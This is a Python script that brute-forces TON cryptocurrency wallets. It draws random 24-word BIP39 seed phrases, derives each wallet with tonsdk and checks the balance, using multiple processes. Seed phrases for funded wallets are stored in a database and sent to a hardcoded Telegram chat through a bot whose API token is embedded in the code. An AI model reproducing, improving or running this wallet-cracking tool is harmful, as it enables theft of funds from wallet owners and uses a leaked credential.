from tonsdk.contract.wallet import Wallets
import multiprocessing
import telebot

import tonsdk
import json
import time


import pandas as pd
import random

bot = telebot.TeleBot(token='5387358716:AAGBJ08tsDxHjQgL2oR-ZXhG2sP9ruxr3E4')
bip39 = pd.read_excel('bip39.xlsx')['#'].to_list()

from utils import get_balance
from db import *


import warnings
warnings.filterwarnings('ignore')


def main(mnemonic: list=None):
    count=0
    # mnemonic = ['forum', 'fun', 'forum', 'gentle', 'assume', 
    #              'pride', 'armed', 'rabbit', 'fish', 'scatter', 
    #              'emerge', 'label', 'ask', 'way', 'deputy', 
    #              'globe', 'strike', 'just', 'vacuum', 'outside', 
    #              'capable', 'cattle', 'property', 'grab']

    while True:
        balance = 0
        mnemonic = random.choices(bip39, k=24)
        # mnemonic = ['wild'] + mnemonic

        if True:#check_mnemonic(mnemonic):
            try:
                mnemonic, pub_k, priv_k, wallet = Wallets.from_mnemonics(mnemonics=mnemonic, workchain=0)
                
                wallet1 = wallet.address.to_string()
                wallet2 = wallet.address.to_string(1, 1, 1, 1)
                
                try:
                    try:
                        balance = float(get_balance(wallet1)['balance'])/10**9
                    except KeyError:
                        pass
                        # try:
                        #     # add_data(-1, wallet2, mnemonic)
                        # except psycopg2.errors.UniqueViolation:
                        #     pass
                        #print(get_balance(wallet1), wallet1, wallet2)
                        #print('here')
                        #time.sleep(30)
                        #break

                    if  balance > .0:
                        message = f'''mnemonic:\n{' '.join(mnemonic)} \n\nbalance: {balance}'''
                        print(mnemonic, '\n', wallet1, '\n', wallet2, '\n', balance, '\n')
                        add_data(balance, wallet2, mnemonic)
                        bot.send_message(918415013, message)
                    else:
                        try:
                            add_data(0, wallet2, mnemonic)
                        except psycopg2.errors.UniqueViolation:
                            pass
                    #print(count, ' ', balance, ' ', mnemonic)

                except json.decoder.JSONDecodeError:
                    print(mnemonic, '\n', wallet1, '\n', wallet2, '\n', '\n')
                    
            except tonsdk.crypto.exceptions.InvalidMnemonicsError:
                pass
                # add_data(-1, 'None', mnemonic)
                # enter_trash(mnemonic)
        count+=1


if __name__ == '__main__':
    
    n_proc = multiprocessing.cpu_count()-4
    for i in range(n_proc):

        process = multiprocessing.Process(target=main)
        process.start()


